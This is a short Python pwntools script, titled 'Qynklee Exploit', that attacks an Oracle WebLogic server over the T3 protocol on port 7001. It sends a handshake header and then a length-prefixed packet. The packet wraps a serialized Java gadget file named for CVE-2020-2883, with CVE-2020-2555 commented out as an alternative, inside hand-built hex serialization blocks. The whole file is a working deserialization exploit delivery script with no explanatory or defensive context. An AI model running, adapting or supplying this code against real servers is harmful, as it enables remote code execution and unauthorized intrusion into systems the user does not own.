#Qynklee Exploit
from pwn import *

IP = "192.168.8.105"
PORT = 7001

r = remote(IP, PORT)

context.log_level = "debug"

#Send Headers:
header = bytearray("t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n","utf-8")
r.send(header)

data = r.recv(1024)

# \x00\x00\x1b\x86 - 4bytes len before payload_1

payload_1 = b"\x01\x65\x01\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00\x00\x71\x00\x00\xEA\x60\x00\x00\x00\x18\x43\x2E\xC6\xA2\xA6\x39\x85\xB5\xAF\x7D\x63\xE6\x43\x83\xF4\x2A\x6D\x92\xC9\xE9\xAF\x0F\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0C\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0C\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xFE\x01\x00\x00"
print(len(payload_1))

Qynklee_payload = open("CVE_2020_2883_v1.ser","rb").read()
#Qynklee_payload = open("cve_2020_2555.ser","rb").read()
print(len(Qynklee_payload))

payload_2 = b"\xFE\x01\x00\x00\xAC\xED\x00\x05\x73\x72\x00\x1D\x77\x65\x62\x6C\x6F\x67\x69\x63\x2E\x72\x6A\x76\x6D\x2E\x43\x6C\x61\x73\x73\x54\x61\x62\x6C\x65\x45\x6E\x74\x72\x79\x2F\x52\x65\x81\x57\xF4\xF9\xED\x0C\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6C\x6F\x67\x69\x63\x2E\x63\x6F\x6D\x6D\x6F\x6E\x2E\x69\x6E\x74\x65\x72\x6E\x61\x6C\x2E\x50\x65\x65\x72\x49\x6E\x66\x6F\x58\x54\x74\xF3\x9B\xC9\x08\xF1\x02\x00\x07\x49\x00\x05\x6D\x61\x6A\x6F\x72\x49\x00\x05\x6D\x69\x6E\x6F\x72\x49\x00\x0B\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0C\x72\x6F\x6C\x6C\x69\x6E\x67\x50\x61\x74\x63\x68\x49\x00\x0B\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6B\x5A\x00\x0E\x74\x65\x6D\x70\x6F\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5B\x00\x08\x70\x61\x63\x6B\x61\x67\x65\x73\x74\x00\x27\x5B\x4C\x77\x65\x62\x6C\x6F\x67\x69\x63\x2F\x63\x6F\x6D\x6D\x6F\x6E\x2F\x69\x6E\x74\x65\x72\x6E\x61\x6C\x2F\x50\x61\x63\x6B\x61\x67\x65\x49\x6E\x66\x6F\x3B\x78\x72\x00\x24\x77\x65\x62\x6C\x6F\x67\x69\x63\x2E\x63\x6F\x6D\x6D\x6F\x6E\x2E\x69\x6E\x74\x65\x72\x6E\x61\x6C\x2E\x56\x65\x72\x73\x69\x6F\x6E\x49\x6E\x66\x6F\x97\x22\x45\x51\x64\x52\x46\x3E\x02\x00\x03\x5B\x00\x08\x70\x61\x63\x6B\x61\x67\x65\x73\x71\x00\x7E\x00\x03\x4C\x00\x0E\x72\x65\x6C\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6F\x6E\x74\x00\x12\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x53\x74\x72\x69\x6E\x67\x3B\x5B\x00\x12\x76\x65\x72\x73\x69\x6F\x6E\x49\x6E\x66\x6F\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5B\x42\x78\x72\x00\x24\x77\x65\x62\x6C\x6F\x67\x69\x63\x2E\x63\x6F\x6D\x6D\x6F\x6E\x2E\x69\x6E\x74\x65\x72\x6E\x61\x6C\x2E\x50\x61\x63\x6B\x61\x67\x65\x49\x6E\x66\x6F\xE6\xF7\x23\xE7\xB8\xAE\x1E\xC9\x02\x00\x09\x49\x00\x05\x6D\x61\x6A\x6F\x72\x49\x00\x05\x6D\x69\x6E\x6F\x72\x49\x00\x0B\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0C\x72\x6F\x6C\x6C\x69\x6E\x67\x50\x61\x74\x63\x68\x49\x00\x0B\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6B\x5A\x00\x0E\x74\x65\x6D\x70\x6F\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4C\x00\x09\x69\x6D\x70\x6C\x54\x69\x74\x6C\x65\x71\x00\x7E\x00\x05\x4C\x00\x0A\x69\x6D\x70\x6C\x56\x65\x6E\x64\x6F\x72\x71\x00\x7E\x00\x05\x4C\x00\x0B\x69\x6D\x70\x6C\x56\x65\x72\x73\x69\x6F\x6E\x71\x00\x7E\x00\x05\x78\x70\x77\x02\x00\x00\x78\xFE\x00\xFF\xFE\x01\x00\x00\xAC\xED\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6C\x6F\x67\x69\x63\x2E\x72\x6A\x76\x6D\x2E\x4A\x56\x4D\x49\x44\xDC\x49\xC2\x3E\xDE\x12\x1E\x2A\x0C\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2E\x30\x2E\x31\x2E\x31\x00\x0B\x75\x73\x2D\x6C\x2D\x62\x72\x65\x65\x6E\x73\xA5\x3C\xAF\xF1\x00\x00\x00\x07\x00\x00\x1B\x59\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x00\x78\xFE\x01\x00\x00\xAC\xED\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6C\x6F\x67\x69\x63\x2E\x72\x6A\x76\x6D\x2E\x4A\x56\x4D\x49\x44\xDC\x49\xC2\x3E\xDE\x12\x1E\x2A\x0C\x00\x00\x78\x70\x77\x1D\x01\x81\x40\x12\x81\x34\xBF\x42\x76\x00\x09\x31\x32\x37\x2E\x30\x2E\x31\x2E\x31\xA5\x3C\xAF\xF1\x00\x00\x00\x00\x00\x78"
print(str(len(payload_2)) + str(type(payload_2)))

footer_payload = payload_1 + Qynklee_payload + payload_2

#tinh do dai payload 
payload_len = len(footer_payload)
payload_len +=4
payload_len_data = p32(payload_len, endian='big')

print(payload_len_data)


#Final payload:
payload = payload_len_data + footer_payload

# temp = bytearray(payload)
# with open("temp.bin","wb") as f:
#     f.write(temp)


#EXPLOIT:
# payloadToSend = bytearray(payload, "utf-8")
r.send(payload)


